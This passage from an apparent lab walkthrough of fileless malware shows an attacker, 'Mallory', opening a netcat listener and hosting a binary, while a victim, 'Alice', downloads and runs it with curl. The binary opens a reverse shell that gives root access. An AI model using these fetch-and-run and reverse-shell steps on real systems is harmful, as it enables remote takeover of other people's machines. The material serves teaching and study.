    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvp 443
listening on [any] 443 ...
</code></pre></div>    </div>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">l</code> tells netcat to be in “listen” mode</li>
      <li><code class="language-plaintext highlighter-rouge">v</code> is for “verbose” mode and</li>
      <li><code class="language-plaintext highlighter-rouge">p</code> is to specify the port we are listening on</li>
    </ul>
  </li>
  <li>Mallory hosts the malware
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/shared# python3 -m http.server 80 --bind 10.0.0.3
</code></pre></div>    </div>
  </li>
  <li>Alice downloads and runs the malware
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/tmp# curl http://10.0.0.3/fileless -o fileless
/home/tmp# chmod +x fileless
/home/tmp# ./fileless
</code></pre></div>    </div>
  </li>
</ol>

<p>As soon as Alice runs the binary, we notice that the terminal where Mallory was listening using netcat connects to Alice’s host</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to [10.0.0.3] from alice.polymal_internal [10.0.0.2] 44640
</code></pre></div></div>

<p>and Mallory can run commands. Since Alice ran the program with root privileges we have</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
root
</code></pre></div></div>

<p>Mallory now has root access to Alice’s machine.</p>


  </div>
</article>


        </div>
      </div>
    </div>
  </body>
</html>
